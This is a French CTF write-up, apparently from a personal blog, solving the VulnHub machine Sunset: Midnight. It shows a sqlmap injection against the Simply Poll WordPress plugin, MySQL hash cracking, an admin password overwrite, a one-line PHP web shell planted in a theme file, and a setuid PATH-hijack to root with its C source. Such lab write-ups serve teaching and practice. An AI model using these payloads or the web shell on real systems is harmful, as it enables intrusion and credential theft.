---
title: "Solution du CTF Sunset: Midnight de VulnHub"
tags: [CTF, VulnHub]
---

[Sunset: Midnight](https://vulnhub.com/entry/sunset-midnight,517/) était un CTF que je recommanderais volontiers à ce qui souhaitent s'exercer sur un boot2root proche de la réalité.

Via un scan de ports avec _Nmap_ on trouve trois services sur la VM : SSH, Apache et MySQL.

## Polly wants a cracker

Le port 80 retourne la page d'un CMS *Wordpress* configuré pour le nom de domaine `sunset-midnight`. On peut déjà rajouter une entrée dans notre fichier `/etc/hosts` pour accéder plus facilement au site.

Le blog indique l'information suivante

> Now, with the use of Simply Poll, we may find out what the customers desire within the available products!

Ce plugin Wordpress est vulnérable à une faille d'injection SQL. Un *Proof of Concept* est présent sur *exploit-db* :

[WordPress Plugin Simply Poll 1.4.1 - SQL Injection - PHP webapps Exploit](https://www.exploit-db.com/exploits/40971)

Le paramètre `pollid` traité par le plugin via l'interface Ajax est celui qui pose problème. Je l'attaque via `sqlmap` :

```bash
python sqlmap.py -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --dbms=mysql --level=5 --risk=3 -p pollid
```

Le scanner nous informe que la vulnérabilité est bien présente :

```
sqlmap identified the following injection point(s) with a total of 2046 HTTP(s) requests:
---
Parameter: pollid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=spAjaxResults&pollid=2 AND (SELECT 7400 FROM (SELECT(SLEEP(5)))JbcI)

    Type: UNION query
    Title: Generic UNION query (random number) - 7 columns
    Payload: action=spAjaxResults&pollid=2 UNION ALL SELECT 1281,1281,1281,1281,1281,CONCAT(0x716b7a7871,0x6379675459764570616a4c4b706f684d6c4179586c6d564b425a76614f714b4542666b4f6b674c66,0x71766b7171),1281-- -
---
```

On peut alors lister les bases de données (option `--dbs`) puis dumper la tables des utilisateurs du blog (`-D wordpress_db -T wp_users --dump`) :

```
Database: wordpress_db
Table: wp_users
[1 entry]
+----+------------------------+------------------------------------+------------+---------------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url               | user_pass                          | user_login | user_email          | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+------------------------+------------------------------------+------------+---------------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://sunset-midnight | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin      | example@example.com | 0           | admin        | admin         | 2020-07-16 19:10:47 | <blank>             |
+----+------------------------+------------------------------------+------------+---------------------+-------------+--------------+---------------+---------------------+---------------------+
```

Malheureusement le hash présent ne tombe pas avec la wordlist `rockyou`.

## Osez José

Avec l'option `--current-user` on apprend que le compte MySQL qui exécute les requêtes se nomme `jose` et l'option `--privileges` nous informe que le compte a des privilèges élevés, notamment le privilège `FILE` permettant la lecture et écriture de fichiers :

```
[*] 'jose'@'localhost' (administrator) [29]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
```

Pour obtenir un fichier, on utilise une option spécifique de `sqlmap` :

```
--file-read /etc/apache2/sites-enabled/000-default.conf
```

On obtient alors la configuration du serveur Apache :

```apache
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/wordpress

        <Directory /var/www/html/wordpress/>
        AllowOverride All
        </Directory>

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost
```

Malheureusement les tentatives de lire le fichier `wp-config.php` ont échouées, tout comme celles visant à déposer un shell dans la racine web (options `--file-write` et `--file-dest`).

Du coup, qu'est-ce que l'on peut faire ? Jetons un œil aux hashes du serveur MySQL avec `--passwords` :

```
[*] jose [1]:
    password hash: *3AA64DAE22DBC5B7ACC28062EB18EFB7046D808C
[*] root [1]:
    password hash: *A14C02465C2ED43BDB89ACC6C7213C1D00617758
```

Le mot de passe de root se casse facilement, il s'agit de `robert`.

Le serveur MySQL étant accessible, il est possible de se connecter et d'exécuter des requêtes SQL d'insertion ou de mise à jour (que l'on ne peut pas exécuter via l'injection SQL qui est une requête `SELECT`).

J'ai choisi de modifier le hash du compte `admin` présent dans la table `wp_users` par un hash dont je connais le clair. Pour cela j'ai pompé un hash croisé sur le CTF [NerdPress]({% link _posts/2022-02-11-Solution-du-CTF-NerdPress-de-iamv1nc3nt.md %}) qui correspond au mot de passe `jazzy123`.

```console
$ mysql -u root -probert -h 192.168.56.166 wordpress_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 135164
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [wordpress_db]> update wp_users set user_pass='$P$Bx9aLfMHwSzWdZm0fwSNQyB8cEr7Uc/' where user_login='admin';
Query OK, 1 row affected (0,010 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

## Edith de 404

Une fois connecté sur le Wordpress avec ce nouveau mot de passe je cherche un fichier PHP dans les thèmes présents que je peux modifier. Le thème courant sembler être en lecture seule, mais le theme `twentynineteen` non. Je rajoute cette ligne au fichier `404.php` :

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

Un reverse shell obtenu plus tard je trouve un mot de passe dans la configuration du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'jose' );

/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Ce mot de passe correspond aussi au compte `jose` du système. Il nous permet d'accéder au premier flag :

```console
jose@midnight:~$ cat user.txt 
956a9564aa5632edca7b745c696f6575
```

## Edith de Path

L'utilisateur n'ayant pas de permissions `sudo`, je fouille sur le système et trouve un binaire setuid inhabituel nommé `status` :

```console
jose@midnight:~$ find / -type f -perm -u+s -ls 2> /dev/null 
   134749     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
   152548    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
   275266     20 -rwsr-sr-x   1 root     root        16768 Jul 18  2020 /usr/bin/status
   131131     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   131136     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   131132     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   135085     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   134602     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   135083     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
   131134     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   268427     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   143469     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   146860    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
```

Un `strings` sur cet exécutable laisse supposer qu'il se charge juste d'appeler `service ssh status` avec la fonction `system()` :

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Status of the SSH server:
service ssh status
```

Je vais donc compiler sous le nom `service` un programme me donnant un shell root et modifier le `PATH` pour que `status` l'exécute à la place du vrai `service`.

```console
jose@midnight:~$ vi gotroot.c
jose@midnight:~$ cat gotroot.c 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        setregid(0, 0);
        system("/usr/bin/bash");
        return 0;
}
jose@midnight:~$ gcc -o service gotroot.c 
jose@midnight:~$ export PATH=.:$PATH
jose@midnight:~$ status
root@midnight:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
root@midnight:~# cd /root
root@midnight:/root# ls
root.txt  status  status.c
root@midnight:/root# cat root.txt
          ___   ____
        /' --;^/ ,-_\     \ | /
       / / --o\ o-\ \\   --(_)--
      /-/-/|o|-|\-\\|\\   / | \
       '`  ` |-|   `` '
             |-|
             |-|O
             |-(\,__
          ...|-|\--,\_....
      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------

db2def9d4ddcb83902b884de39d426e6

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```


